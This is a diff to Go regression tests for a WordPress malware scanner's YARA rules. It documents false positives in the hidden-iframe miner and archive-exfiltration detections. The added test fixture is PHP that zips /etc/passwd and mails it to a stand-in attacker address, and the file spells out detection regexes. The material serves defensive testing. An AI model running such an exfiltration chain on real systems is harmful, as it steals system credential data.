@@ -10,13 +10,19 @@ import "testing"
 // internal/signatures/fp_forgetwhite_*_test.go. These pin the YARA side.
 
 // miner_hidden_iframe used:
-//   $iframe = /<iframe[^>]*(?:width=['"]0|height=['"]0|display:\s*none|visibility:\s*hidden)/
-//   $miner  = /(?:miner|coin|mine|crypto)/ nocase
-//   condition: $iframe and $miner
+//
+//	$iframe = /<iframe[^>]*(?:width=['"]0|height=['"]0|display:\s*none|visibility:\s*hidden)/
+//	$miner  = /(?:miner|coin|mine|crypto)/ nocase
+//	condition: $iframe and $miner
+//
 // Bug 1: width=['"]0 has no word boundary, so it matches `marginwidth="0"`
-//        on WordPress oEmbed iframes (legit attribute, not a hiding attr).
+//
+//	on WordPress oEmbed iframes (legit attribute, not a hiding attr).
+//
 // Bug 2: $miner runs across the whole file; "mine" matches the substring
-//        in benign words like "Determines"/"discover" anywhere in WP core.
+//
+//	in benign words like "Determines"/"discover" anywhere in WP core.
+//
 // Both must be inside the same iframe tag, or the miner term must be the
 // content of the iframe src URL.
 func TestMinerHiddenIframe_WPCoreEmbedIsNotMiner(t *testing.T) {
@@ -91,7 +97,9 @@ func TestDefaceOwnedBy_RealHTMLDefacement(t *testing.T) {
 }
 
 // exfil_archive_send used:
-//   $zip and $add and any of ($send*)
+//
+//	$zip and $add and any of ($send*)
+//
 // where $send* is mail(/curl_exec(/readfile(. With no proximity requirement,
 // any plugin that has all three tokens anywhere fires. Elementor's
 // includes/template-library/sources/local.php legitimately uses ZipArchive
@@ -141,5 +149,16 @@ mail('attacker@evil.example', 'loot', $body);
 `)
 	if !hasYaraRule(scanner.ScanBytes(malicious), "exfil_archive_send") {
 		t.Error("exfil_archive_send YARA regression: ZipArchive + addFile + mail() exfil chain was not detected")
+	}
+
+	namespaced := []byte(`<?php
+$z = new \ZipArchive();
+$z->open('/tmp/d.zip', ZipArchive::CREATE);
+$z->addFile('/etc/passwd');
+$z->close();
+mail('attacker@evil.example', 'loot', file_get_contents('/tmp/d.zip'));
+`)
+	if !hasYaraRule(scanner.ScanBytes(namespaced), "exfil_archive_send") {
+		t.Error("exfil_archive_send YARA regression: namespaced ZipArchive + addFile + mail() exfil chain was not detected")
 	}
 }
